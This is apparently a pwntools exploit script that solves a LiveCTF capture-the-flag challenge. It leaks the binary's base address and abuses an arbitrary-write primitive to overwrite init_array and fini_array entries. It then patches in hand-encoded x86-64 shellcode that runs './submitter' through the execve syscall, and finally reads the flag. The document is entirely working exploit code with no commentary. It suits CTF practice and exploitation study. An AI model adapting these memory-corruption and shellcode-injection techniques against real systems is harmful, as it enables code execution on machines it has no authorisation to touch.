#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

elf_base=u64(p.recv(8))
#print("[+] elf_base :"+hex(elf_base))

init_arr=elf_base+0x4328
fini_arr=elf_base+0x4338

def arbw(addr,val):
    p.send(p64(addr))
    sleep(0.2)
    p.send(p64(val))
    sleep(0.2)

def endarbw():
    p.send(p64(0))
    sleep(0.2)

arbw(init_arr+8,elf_base+0x1370)
arbw(fini_arr,elf_base+0x2000)
endarbw()
p.send(p32(0))

code=[
    u64(b'H\xc7\xc0ter\x00P'),
    u64(b'H\xb8./subm'),
    u64(b'itPH\x89\xe7H\xc7'),
    u64(b'\xc6\x00\x00\x00\x00H\xc7\xc2'),
    u64(b'\x00\x00\x00\x00H\xc7\xc0;'),
    u64(b'\x00\x00\x00\x0f\x05\0\0\0'),
]
start_patch=elf_base+0x2000+0x140
for i in range(len(code)):
    arbw(start_patch+i*8,code[i])
endarbw()

sleep(0.5)
p.recvuntil("Correct!")
flag = p.recvline_contains(b'LiveCTF{')
log.info('Flag: %s', flag)
# p.interactive()
